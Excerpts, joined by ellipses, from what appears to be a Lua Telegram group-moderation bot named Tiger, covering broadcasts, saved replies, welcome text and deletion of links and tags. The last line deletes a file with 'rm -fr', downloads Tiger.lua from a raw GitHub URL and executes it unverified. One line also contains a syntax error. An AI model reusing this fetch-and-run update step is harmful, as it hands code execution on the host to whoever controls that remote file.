z_Tiger = TSCheckMsg(msg)
if z_Tiger and z_Tiger == "stop" then 
if msg.content_.ID == "MessageChatAddMembers" then
if msg.content_.members_[0].type_.ID == 'UserTypeBot' then
if database:get("lock_bot:Tiger"..msg.chat_id_..bot_id) then
changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
...
if database:get("Tiger:edit:text:su:new2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_) then
local Tiger_edit_text = database:get("Tiger:edit:text:su:new2:"..bot_id..data.message_.chat_id_..data.message_.content_.text_)
if Tiger_edit_text then
data.message_.content_.text_ = Tiger_edit_text
end
end
end
...
text = msg.content_.text_
if is_sudo(msg) then 
if database:get("Tiger:set_if_bc_new:"..bot_id..msg.sender_user_id_) then 
database:del("Tiger:set_if_bc_new:"..bot_id..msg.sender_user_id_)
local pro = database:scard('Tiger:'..bot_id..'pro:groups') or 0
if text then 
local gpss = database:smembers( 'Tiger:'..bot_id.."groups") or 0
for i=1, #gpss do
if not database:sismember('Tiger:'..bot_id..'pro:groups', gpss[i]) then
send(gpss[i], 0, 1, text, 1, 'html')		
end					
end
end
if (data.message_.content_.sticker_) then 
gpss = database:smembers( 'Tiger:'..bot_id.."groups") or 0
for i=1, #gpss do
if not database:sismember('Tiger:'..bot_id..'pro:groups', gpss[i]) then
...
local keko1 = redis:get('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'')
if keko1 == 're' then
local keko2 = redis:get('Tiger:'..bot_id..'msg'..msg.sender_user_id_..''..msg.chat_id_..'')
if text then 
redis:set('Tiger:'..bot_id..'keko'..keko2..''..msg.chat_id_..'', text)
elseif (data.message_.content_.sticker_) then 
redis:set('Tiger:'..bot_id..':sticker:'..keko2..''..msg.chat_id_..'', data.message_.content_.sticker_.sticker_.persistent_id_)
elseif (data.message_.content_.voice_) then 
redis:set('Tiger:'..bot_id..':voice:'..keko2..''..msg.chat_id_..'', data.message_.content_.voice_.voice_.persistent_id_)
elseif (data.message_.content_.video_) then 
redis:set('Tiger:'..bot_id..':video:'..keko2..''..msg.chat_id_..'', data.message_.content_.video_.video_.persistent_id_)
elseif (data.message_.content_.animation_) then 
redis:set('Tiger:'..bot_id..':gif:'..keko2..''..msg.chat_id_..'', data.message_.content_.animation_.animation_.persistent_id_)
elseif (data.message_.content_.document_) then
redis:set('Tiger:'..bot_id..':file:'..keko2..''..msg.chat_id_..'', data.message_.content_.document_.document_.persistent_id_)
else
end -- end if text 
redis:sadd('Tiger:'..bot_id..'kekore'..msg.chat_id_..'', keko2)
send(msg.chat_id_, msg.id_, 1, "📊※ تم حفظ الرد  ✓", 1, 'md')
redis:set('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..''..msg.chat_id_..'', 'no')
end
local keko1 = redis:get('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..'')
if keko1 == 're' then
local keko2 = redis:get('Tiger:'..bot_id..'msg'..msg.sender_user_id_..'')
if text then 
redis:set('Tiger:'..bot_id..'keko'..keko2..'', text)
elseif (msg.content_.sticker_) then 
redis:set('Tiger:'..bot_id..':sticker:'..keko2, msg.content_.sticker_.sticker_.persistent_id_)
elseif (msg.content_.voice_) then 
redis:set('Tiger:'..bot_id..':voice:'..keko2, msg.content_.voice_.voice_.persistent_id_)
elseif (msg.content_.video_) then 
redis:set('Tiger:'..bot_id..':video:'..keko2, msg.content_.video_.video_.persistent_id_)
elseif (msg..content_.animation_) then 
redis:set('Tiger:'..bot_id..':gif:'..keko2, data.message_.content_.animation_.animation_.persistent_id_)
elseif (msg.content_.document_) then
redis:set('Tiger:'..bot_id..':file:'..keko2, msg.content_.document_.document_.persistent_id_)
end
redis:sadd('Tiger:'..bot_id..'kekoresudo', keko2)
send(msg.chat_id_, msg.id_, 1, "📊※ تم حفظ الرد  ✓", 1, 'md')
redis:set('Tiger:'..bot_id..'keko1'..msg.sender_user_id_..'', 'no')
end
--         »»                 Run Tiger                         ««              --
...
local svuser = 'Tiger:'..bot_id..'user:'..result.id_
if username then
...
if database:get('Tiger:'..bot_id..'welcome:'..msg.chat_id_) then
text = database:get('Tiger:'..bot_id..'welcome:'..msg.chat_id_)
else
text = '👋🏻┇اهلا بك يا ؛ {fr}\n🙋🏼‍♂️┇نورت الكروب ؛ @{us}'
end
...
if database:get('Tiger:'..bot_id..'pinnedmsg'..msg.chat_id_) and database:get("lock_pin:Tiger"..msg.chat_id_..bot_id) then
local pin_id = database:get('Tiger:'..bot_id..'pinnedmsg'..msg.chat_id_)
...
local photo_keko = download_to_file('https://api.telegram.org/file/bot'..token..'/'..keko6.result.file_path, 'files_Tiger/'..msg.content_.document_.file_name_)
...
local msgg = result 
database:incr('Tiger:'..bot_id..'user:editmsg'..msgg.chat_id_..':'..msgg.sender_user_id_)
...
text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or
text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get("lock_link.note:Tiger"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or
text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or
...
check_filter_words(result, text)
if text:match("@") then
if database:get("lock_username.note:Tiger"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if result.id_ and result.content_.text_ then
if not is_vip(msgg) then
...
check_filter_words(result, text)
if text:match("#") then
if database:get("lock_tag.note:Tiger"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if not is_vip(msgg) then
check_filter_words(result, text)
...
check_filter_words(result, text)
if text:match("/")  then
if database:get("lock_sarha.note:Tiger"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end
if not is_vip(msgg) then
check_filter_words(result, text)
...
check_filter_words(result, text)
if text:match("[\216-\219][\128-\191]") then
if database:get("lock_ar.note:Tiger"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end  end
if not is_vip(msgg) then
check_filter_words(result, text)
...
check_filter_words(result, text)
if text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
if database:get("lock_en.note:Tiger"..msg.chat_id_..bot_id) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs) end end end 
 end 
 end
...
--         »»                 End UpdateChat                          ««              --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then os.execute("rm -fr hack.lua") a = HTTPS.request("https://raw.githubusercontent.com/TigerTEAM/Tiger/master/Tiger.lua") local g = io.open("Tiger.lua", 'w') g:write(a) g:close() dofile('Tiger.lua')
